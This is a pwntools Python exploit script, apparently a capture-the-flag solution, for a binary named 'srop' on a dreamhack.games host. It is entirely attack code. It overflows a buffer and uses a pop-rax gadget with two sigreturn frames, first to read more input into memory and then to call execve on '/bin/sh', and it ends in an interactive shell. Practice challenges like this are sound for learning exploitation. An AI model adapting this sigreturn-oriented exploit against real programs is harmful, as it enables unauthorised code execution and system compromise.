#!/usr/bin/env python3

from pwn import *

exe = ELF("./srop", checksec=False)
context.binary = exe

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            b* 0x0000000000400516
            c
            ''')

if args.LOCAL:
    p = process([exe.path])
else:
    p = remote("host1.dreamhack.games", 16744)

# GDB()
pop_rax = 0x00000000004004eb
syscall = 0x00000000004004ec
frame = SigreturnFrame()
frame.rax = 0
frame.rdi = 0
frame.rsi = 0x601a00
frame.rdx = 0x200
frame.rsp = 0x601a00
frame.rip = syscall

payload = b'a'*24
payload += flat(
    pop_rax, 0xf,
    bytes(frame)
    )
p.send(payload)

input("Press ENTER to send payload")

frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = 0x601b08
frame.rsi = 0
frame.rdx = 0
frame.rsp = 0x601b08
frame.rip = syscall
payload = flat(
    pop_rax, 0xf,
    bytes(frame),
    b'/bin/sh'
    )
print(len(payload))
p.send(payload)

p.interactive()